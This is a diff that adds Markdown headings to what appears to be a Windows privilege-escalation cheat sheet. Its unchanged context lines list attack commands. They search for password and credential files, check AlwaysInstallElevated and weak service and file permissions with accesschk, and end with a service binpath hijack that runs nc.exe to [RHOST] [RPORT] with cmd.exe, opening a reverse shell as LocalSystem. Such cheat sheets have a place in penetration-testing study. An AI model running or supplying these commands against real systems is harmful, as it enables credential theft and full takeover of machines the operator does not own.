@@ -55,6 +55,9 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 
+### Quick wins
+---
+
 // Quick wins
 dir /s *pass* == *cred* == *vnc* == *.config*
 findstr /si password *.xml *.ini *.txt
@@ -72,6 +75,9 @@ DataSources\DataSources.xml: Element-Specific Attributes
 // Service permissions
 sc query
 sc qc [service_name]
+
+### Accesschk
+---
 
 // Accesschk (part of "sysinternals")
 accesschk.exe /accepteula (need to add that if you don't have GUI. maybe only the first time?)
@@ -97,7 +103,7 @@ accesschk.exe -uwdqs "[Group name you belong to]" c:\
 // Find all weak file permissions per drive.
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "[Group name you belong to]" c:\*.*
-
+---
 // Binary planting
 sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
 sc config [service_name] obj= ".\LocalSystem" password= ""
